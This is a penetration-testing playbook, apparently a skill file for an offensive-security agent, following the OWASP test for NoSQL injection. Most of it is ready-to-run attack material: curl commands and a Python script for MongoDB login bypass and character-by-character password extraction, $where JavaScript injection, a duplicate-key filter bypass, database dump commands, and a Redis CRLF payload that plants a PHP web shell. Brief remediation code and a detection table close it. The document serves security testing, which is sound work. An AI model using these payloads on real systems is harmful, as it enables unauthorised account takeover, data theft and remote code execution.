---
name: wstg-inpv-05.6
description: "Testing for NoSQL Injection"
category: input-validation
owasp_id: WSTG-INPV-05.6
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "NoSQL Injection (e.g. MongoDB update/insert operators) allows writing attacker-controlled data into document fields rendered without sanitization elsewhere, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
---

# wstg-inpv-05.6

## Test ID

WSTG-INPV-05.6

## Test Name

Testing for NoSQL Injection

## High-Level Description

NoSQL injection targets NoSQL databases (MongoDB, CouchDB, Redis, etc.) where traditional SQL injection techniques don't apply. These databases use different query languages and data structures, but are still vulnerable to injection attacks through JSON payloads, JavaScript execution, and operator manipulation.

---

## What to Check

- [ ] MongoDB operator injection ($gt, $ne, $regex)
- [ ] JSON injection in queries
- [ ] JavaScript execution (server-side)
- [ ] Authentication bypass
- [ ] Path / route-parameter operator injection (/resource/:id)
- [ ] Array/object injection
- [ ] Redis command injection

---

## How to Test

### Step 1: NoSQL Injection Detection

```bash
#!/bin/bash
TARGET="https://target.com/api/login"

echo "[*] Testing for NoSQL injection..."

# MongoDB operator injection
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Array injection
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$gt":""}}'

# Regex injection
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$regex":"^admin"},"password":{"$ne":""}}'

# URL parameter injection
curl -s "$TARGET?username[\$ne]=&password[\$ne]="

# Path / route parameter injection — DO NOT skip path params.
# Many REST apps interpolate a path segment straight into a Mongo query
# (e.g. /resource/:id, /track-order/:id, /orders/:id). Inject there too:
curl -s "$TARGET/rest/<resource>/<id>' || 'a'=='a"
curl -s "$TARGET/rest/<resource>/<id>%27%20%7C%7C%20%271%27%3D%3D%271"   # URL-encoded
curl -s "$TARGET/api/<Collection>/{\"\$gt\":\"\"}"
# A path param that alters the result set / returns other users' records /
# errors with a Mongo message is injectable. This vector is the one most often
# MISSED because testers only fuzz query + body.
```

### Step 2: NoSQL Injection Tester

```python
#!/usr/bin/env python3
"""
NoSQL Injection Vulnerability Tester
Supports MongoDB, CouchDB, and general NoSQL patterns
"""

import requests
import json
import re

class NoSQLInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # MongoDB operator payloads
    MONGODB_PAYLOADS = {
        'auth_bypass': [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$ne": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}},
        ],
        'data_extraction': [
            {"$where": "this.username == 'admin'"},
            {"$where": "function(){return true}"},
            {"username": {"$regex": "^a"}},
            {"username": {"$regex": "^admin"}},
        ],
        'operator_injection': [
            {"$or": [{"username": "admin"}, {"username": "user"}]},
            {"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
        ],
    }

    # JavaScript injection payloads
    JS_PAYLOADS = [
        "'; return true; var x='",
        "'; return this.password; var x='",
        "1'; return true; '",
        "1 || 1==1",
        "this.password.match(/.*/)//",
    ]

    def test_mongodb_auth_bypass(self):
        """Test MongoDB authentication bypass"""
        print("\n[*] Testing MongoDB authentication bypass...")

        for payload in self.MONGODB_PAYLOADS['auth_bypass']:
            try:
                response = self.session.post(
                    self.url,
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )

                # Check for successful bypass indicators
                if response.status_code == 200:
                    try:
                        resp_json = response.json()
                        if 'token' in resp_json or 'session' in resp_json or 'success' in resp_json:
                            print(f"[VULN] Auth bypass possible!")
                            print(f"  Payload: {json.dumps(payload)}")
                            self.findings.append({
                                'type': 'MongoDB Auth Bypass',
                                'payload': payload,
                                'severity': 'Critical'
                            })
                            return True
                    except:
                        if len(response.text) > 100:
                            print(f"[WARN] Potential auth bypass")
                            print(f"  Payload: {json.dumps(payload)}")

            except Exception as e:
                pass

        return False

    def test_url_parameter_injection(self):
        """Test NoSQL injection via URL parameters"""
        print("\n[*] Testing URL parameter injection...")

        payloads = [
            "username[$ne]=&password[$ne]=",
            "username[$gt]=&password[$gt]=",
            "username[$regex]=.*&password[$regex]=.*",
            "username=admin&password[$ne]=",
        ]

        base_url = self.url.split('?')[0]

        for payload in payloads:
            try:
                response = self.session.get(f"{base_url}?{payload}")

                if response.status_code == 200 and len(response.text) > 50:
                    print(f"[WARN] Potential injection via URL params")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'URL Parameter NoSQL Injection',
                        'payload': payload,
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_javascript_injection(self):
        """Test JavaScript injection ($where, mapReduce)"""
        print("\n[*] Testing JavaScript injection...")

        for js_payload in self.JS_PAYLOADS:
            # Test in $where clause
            payload = {"$where": js_payload}

            try:
                response = self.session.post(
                    self.url,
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )

                # Check for execution indicators
                if response.status_code == 200:
                    print(f"[INFO] JS payload accepted: {js_payload[:40]}")

                # Check for errors that confirm MongoDB
                if 'SyntaxError' in response.text or 'ReferenceError' in response.text:
                    print(f"[INFO] MongoDB JavaScript error detected")

            except Exception as e:
                pass

    def test_regex_extraction(self):
        """Test data extraction via regex injection"""
        print("\n[*] Testing regex-based data extraction...")

        # Character-by-character extraction
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        extracted = ""

        for i in range(20):  # Extract up to 20 characters
            found = False
            for char in charset:
                payload = {
                    "username": "admin",
                    "password": {"$regex": f"^{extracted}{char}"}
                }

                try:
                    response = self.session.post(
                        self.url,
                        json=payload,
                        headers={'Content-Type': 'application/json'}
                    )

                    # If response indicates success
                    if response.status_code == 200 and ('token' in response.text.lower() or
                        'success' in response.text.lower()):
                        extracted += char
                        found = True
                        print(f"  Extracted: {extracted}")
                        break

                except Exception as e:
                    pass

            if not found:
                break

        if extracted:
            print(f"[VULN] Regex extraction successful: {extracted}")
            self.findings.append({
                'type': 'NoSQL Regex Data Extraction',
                'extracted': extracted,
                'severity': 'Critical'
            })

    def test_array_injection(self):
        """Test array/object injection"""
        print("\n[*] Testing array/object injection...")

        payloads = [
            {"username": ["admin", "user"], "password": {"$ne": ""}},
            {"username": {"$in": ["admin"]}, "password": "test"},
            {"username": "admin", "password": ["", {"$ne": ""}]},
        ]

        for payload in payloads:
            try:
                response = self.session.post(
                    self.url,
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )

                if response.status_code == 200:
                    print(f"[INFO] Array injection accepted")

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("NOSQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo NoSQL injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {json.dumps(f['payload'])[:70]}")
                if 'extracted' in f:
                    print(f"  Extracted: {f['extracted']}")

    def run_tests(self):
        """Run all NoSQL injection tests"""
        self.test_mongodb_auth_bypass()
        self.test_url_parameter_injection()
        self.test_javascript_injection()
        self.test_array_injection()
        # self.test_regex_extraction()  # Uncomment for active extraction
        self.generate_report()

# Usage
tester = NoSQLInjectionTester("https://target.com/api/login")
tester.run_tests()
```

### Step 3: Database-Specific Payloads

```javascript
// MongoDB Payloads

// Authentication Bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}

// $where JavaScript Injection
{"$where": "1 == 1"}
{"$where": "function() { return true; }"}
{"$where": "this.password.length > 0"}

// $regex Data Extraction
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
// Continue character by character

// Operator Injection
{"username": "admin", "password": {"$type": 2}}  // Type 2 = string
{"username": {"$exists": true}, "password": {"$exists": true}}
```

```python
# CouchDB Payloads
# URL-based injection
GET /db/_find?selector={"username":"admin","password":{"$regex":".*"}}

# Mango query injection
{"selector": {"username": "admin", "password": {"$gt": ""}}}
```

```bash
# Redis Command Injection
# If user input is concatenated into Redis commands

# EVAL command injection
EVAL "return redis.call('keys','*')" 0

# Newline injection
SET user "test\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload '<?php system($_GET[cmd]); ?>'\r\nSAVE"
```

---

## Tools

| Tool       | Purpose                   |
| ---------- | ------------------------- |
| NoSQLMap   | Automated NoSQL injection |
| Burp Suite | Manual testing            |
| mongosh    | MongoDB client            |
| redis-cli  | Redis client              |

---

## Example Commands/Payloads

### MongoDB Auth Bypass (curl, JSON API)

```bash
TARGET="https://target.com/api/login"

# Operator injection - $ne / $gt bypass
curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}'

curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$gt":""}}'

# Same bypass via URL-encoded form params (common in Express + body-parser)
curl -s -X POST "$TARGET" -d "username[\$ne]=x&password[\$ne]=y"

# $where JavaScript injection (if input reaches a $where clause)
curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
    -d '{"username":"admin","$where":"sleep(5000)"}'
```

### Blind Data Extraction via $regex

```bash
# Extract password character by character using regex anchors
for c in a b c d e f 0 1 2 3; do
  resp=$(curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
      -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}")
  echo "$c -> $resp" | grep -q "success" && echo "[+] Next char: $c"
done
```

### mongosh / redis-cli Direct Access (if reachable / creds obtained)

```bash
# MongoDB - dump collections once auth is bypassed or creds found
mongosh "mongodb://target.com:27017/appdb" --eval "db.users.find().pretty()"

# Redis - command injection via CRLF if user input is concatenated raw into protocol
redis-cli -h target.com -p 6379 EVAL "return redis.call('keys','*')" 0
```

### Automated Scanner

```bash
# NoSQLMap - detect and exploit MongoDB injection
python2 nosqlmap.py   # interactive menu: set target URL, request method, injectable param
```

### Full Operator Auth-Bypass Set (form-encoded, one line per technique)

```bash
# $ne, $regex, $gt/$lt range trick, $nin exclusion - each is a standalone bypass
curl -s -X POST "$TARGET" -d "username[\$ne]=toto&password[\$ne]=toto"
curl -s -X POST "$TARGET" -d "login[\$regex]=a.*&pass[\$ne]=lol"
curl -s -X POST "$TARGET" -d "login[\$gt]=admin&login[\$lt]=test&pass[\$ne]=1"
curl -s -X POST "$TARGET" -d "login[\$nin][]=admin&login[\$nin][]=test&pass[\$ne]=toto"
```

### Extract Data Length Before Content (narrows the char-by-char search space)

```bash
# Increase {n} until the response flips true - reveals password length first
for n in 1 2 3 4 5 6 7 8; do
  curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
      -d "{\"username\":{\"\$ne\":\"toto\"},\"password\":{\"\$regex\":\"^.{$n}$\"}}"
done
```

### $in Operator - Batch-Guess Common Usernames in One Request

```bash
curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
    -d '{"username":{"$in":["admin","4dm1n","administrator","root"]},"password":{"$gt":""}}'
```

### Duplicate-Key WAF/Filter Bypass

If the app strips `$`-prefixed keys from top-level JSON but not from a duplicated key, MongoDB/Node JSON parsers keep only the *last* occurrence of a duplicate key — smuggle the operator past a naive sanitizer:

```json
{"password": "dummy", "password": {"$ne": "dummy"}}
```

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| Login succeeds with `{"$ne": null}` / `{"$gt": ""}` instead of a real credential | NoSQL operator injection — authentication bypass confirmed |
| Response differs (true/false) based on `$regex` anchor character | Blind boolean-based NoSQL injection, data can be exfiltrated char-by-char |
| Response delayed when `$where` payload contains `sleep(N)` | Server-side JavaScript execution via `$where` — high severity (RCE-adjacent) |
| Array/object syntax in form field (`field[$ne]=x`) is accepted and parsed as an operator | Framework's body parser (e.g. `qs`/`body-parser`) auto-expands bracket notation into query operators |
| A duplicated JSON key with a later `$`-operator value still takes effect after sanitization | Sanitizer only strips the first occurrence — duplicate-key WAF bypass confirmed |
| `$regex":"^.{n}$"` flips true at exactly one length `n` | Field length disclosed, reduces subsequent char-by-char brute force to that fixed length |

---

## Remediation

```javascript
// Node.js/MongoDB - Input validation
const mongoose = require("mongoose")

// Sanitize input - remove $ operators
function sanitize(obj) {
  if (typeof obj === "object") {
    for (let key in obj) {
      if (key.startsWith("$")) {
        delete obj[key]
      } else {
        sanitize(obj[key])
      }
    }
  }
  return obj
}

// Use parameterized queries
async function findUser(username, password) {
  // Type checking
  if (typeof username !== "string" || typeof password !== "string") {
    throw new Error("Invalid input types")
  }

  return await User.findOne({
    username: username,
    password: hashPassword(password),
  })
}

// mongo-sanitize library
const sanitize = require("mongo-sanitize")
const cleanInput = sanitize(userInput)
```

```python
# Python/PyMongo
from bson import ObjectId
import re

def sanitize_input(data):
    """Remove MongoDB operators from input"""
    if isinstance(data, dict):
        return {k: sanitize_input(v) for k, v in data.items()
                if not k.startswith('$')}
    elif isinstance(data, list):
        return [sanitize_input(item) for item in data]
    return data
```

---

## Risk Assessment

| Finding                       | CVSS | Severity |
| ----------------------------- | ---- | -------- |
| NoSQL auth bypass             | 9.8  | Critical |
| JavaScript injection ($where) | 9.1  | Critical |
| Regex data extraction         | 7.5  | High     |
| Operator injection            | 7.5  | High     |

---

## CWE Categories

| CWE ID      | Title                                                           |
| ----------- | --------------------------------------------------------------- |
| **CWE-943** | Improper Neutralization of Special Elements in Data Query Logic |

---

## References

- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/)
- [MongoDB Security](https://docs.mongodb.com/manual/security/)
- [PayloadsAllTheThings - NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)


---

## Checklist

```
[ ] MongoDB operator injection tested
[ ] URL parameter injection tested
[ ] JavaScript injection tested
[ ] Array/object injection tested
[ ] Regex extraction tested
[ ] Authentication bypass tested
[ ] Findings documented
```
